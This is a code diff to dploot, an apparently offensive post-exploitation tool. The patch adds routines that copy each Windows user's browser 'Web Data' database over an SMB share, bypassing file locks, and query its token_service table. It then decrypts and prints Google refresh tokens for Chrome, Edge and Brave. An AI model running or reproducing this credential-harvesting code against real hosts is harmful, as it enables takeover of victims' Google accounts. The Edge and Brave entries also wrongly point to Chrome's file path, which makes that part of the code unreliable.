@@ -11,7 +11,6 @@ from dploot.lib.dpapi import decrypt_blob, find_masterkey_for_blob
 from dploot.lib.smb import DPLootSMBConnection
 from dploot.lib.target import Target
 from dploot.lib.utils import datetime_to_time
-from dploot.lib.wmi import DPLootWmiExec
 from dploot.triage.masterkeys import Masterkey
 from dataclasses import dataclass
 
@@ -60,12 +59,29 @@ class Cookie:
     def dump_quiet(self) -> None:
         print("[%s] %s%s - %s:%s" % (self.browser.upper(), self.host, self.path, self.cookie_name, self.cookie_value))
 
+@dataclass
+class GoogleRefreshToken:
+    winuser: str
+    browser: str
+    service: str
+    token: str
+
+    def dump(self) -> None:
+        print('[%s - GOOGLE REFRESH TOKEN]' % self.browser.upper())
+        print('Service:\t%s' % self.service)
+        print('Token:\t\t%s' % self.token)
+        print()
+
+    def dump_quiet(self) -> None:
+        print("[%s] GRT %s:%s" % (self.browser.upper(), self.service, self.token))
+
 class BrowserTriage:
 
     false_positive = ['.','..', 'desktop.ini','Public','Default','Default User','All Users']
     user_google_chrome_generic_login_path = {
         'aesStateKeyPath':'Users\\%s\\AppData\\Local\\Google\\Chrome\\User Data\\Local State',
         'loginDataPath':'Users\\%s\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data',
+        'webDataPath':'Users\\%s\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Web Data',
         'cookiesDataPath':[
             'Users\\%s\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies',
             'Users\\%s\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies'
@@ -74,6 +90,7 @@ class BrowserTriage:
     user_msedge_generic_login_path = {
         'aesStateKeyPath':'Users\\%s\\AppData\\Local\\Microsoft\\Edge\\User Data\\Local State',
         'loginDataPath':'Users\\%s\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data',
+        'webDataPath':'Users\\%s\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Web Data',
         'cookiesDataPath':[
             'Users\\%s\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cookies',
             'Users\\%s\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies'
@@ -82,6 +99,7 @@ class BrowserTriage:
     user_brave_generic_login_path = {
         'aesStateKeyPath':'Users\\%s\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Local State',
         'loginDataPath':'Users\\%s\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data',
+        'webDataPath':'Users\\%s\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Web Data',
         'cookiesDataPath':[
             'Users\\%s\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Cookies',
             'Users\\%s\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\Cookies'
@@ -185,6 +203,24 @@ class BrowserTriage:
                                     expires_utc=expires_utc,
                                     last_access_utc=last_access_utc))
                         fh.close()
+            webData_bytes = self.conn.readFile(shareName=self.share, path=paths['webDataPath'] % user, bypass_shared_violation=True)
+            if aeskey is not None and webData_bytes is not None and len(webData_bytes) > 0:
+                fh = tempfile.NamedTemporaryFile()
+                fh.write(webData_bytes)
+                fh.seek(0)
+                db = sqlite3.connect(fh.name)
+                cursor = db.cursor()
+                query = cursor.execute('SELECT service, encrypted_token FROM token_service')
+                lines = query.fetchall()
+                if len(lines) > 0:
+                    for service, encrypted_grt in lines:
+                        token = decrypt_chrome_password(encrypted_grt, aeskey)
+                        credentials.append(GoogleRefreshToken(
+                            winuser=user,
+                            browser=browser,
+                            service=service,
+                            token = token
+                        ))
         return credentials, cookies
 
     @property
